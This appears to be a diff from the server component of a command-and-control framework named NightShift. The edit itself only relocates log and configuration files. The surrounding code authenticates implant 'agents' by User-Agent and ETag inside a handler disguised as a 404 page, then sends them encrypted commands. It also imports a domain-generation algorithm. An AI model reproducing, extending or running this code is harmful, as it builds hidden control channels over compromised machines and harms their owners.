@@ -13,12 +13,12 @@ from nightshift_utility import NightShift_DGA, NightShift_Cipher
 def ns_server_log(ns_post_log2file):
     time_stamp = datetime.now()
     log_time = time_stamp.strftime('%Y%m%d')
-    ns_post_log = log_time + '_nightshift_post.log'
+    ns_post_log = './log/nightshift_server_' + log_time + '.log'
     logging.basicConfig(format='%(asctime)s - %(message)s', filename=ns_post_log, level=logging.INFO)
     logging.info(ns_post_log2file)
 
 def nc_server_config():
-    ns_sconfig_read_path = 'ns_s_config.json'
+    ns_sconfig_read_path = './conf/ns_s_config.json'
     with open(ns_sconfig_read_path) as ns_sconfig_f:
         ns_sconfig_data = json.load(ns_sconfig_f)
         ns_getua_data = ns_sconfig_data.get('ns_get_ua')
@@ -89,8 +89,8 @@ async def FourOFour(request):
     ns_et_chk = ns_hdr.get('ETag')
     if (ns_ua_chk == ns_cget_ua and ns_et_chk == ns_hsh_key):
         print('[+] {0:s} --> A Nightshift Agent has requested payload. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
-        ns_cmd_path = "ns_fof_cmd.json"
-        ns_custom_fof_path = 'ns_custom_fof.txt'
+        ns_cmd_path = "./conf/ns_fof_cmd.json"
+        ns_custom_fof_path = './conf/ns_custom_fof.txt'
         with open(ns_cmd_path, 'r') as ns_cmd_f:
             ns_cmd_f = ns_cmd_f.read()
             ns_cipher_cmd = ns_get_cipher.encrypt(ns_cmd_f)
